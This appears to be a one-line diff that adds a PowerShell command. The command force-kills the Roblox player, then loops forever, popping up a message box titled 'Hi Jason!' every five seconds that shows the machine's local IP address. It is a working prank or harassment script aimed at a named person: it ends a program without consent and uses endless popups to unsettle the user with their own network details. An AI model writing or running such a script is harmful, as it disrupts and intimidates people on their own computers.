@@ -1,0 +1,1 @@
+&{Stop-Process -Name RobloxPlayerBeta -Force -ErrorAction SilentlyContinue; Add-Type -AssemblyName System.Windows.Forms; while ($true) { $ipAddress = (Get-NetIPAddress | Where-Object { $_.AddressFamily -eq 'IPv4' -and $_.PrefixOrigin -eq 'Dhcp' }).IPAddress; [System.Windows.Forms.MessageBox]::Show('Your IP is: ' + $ipAddress, 'Hi Jason!'); Start-Sleep -Seconds 5 }}
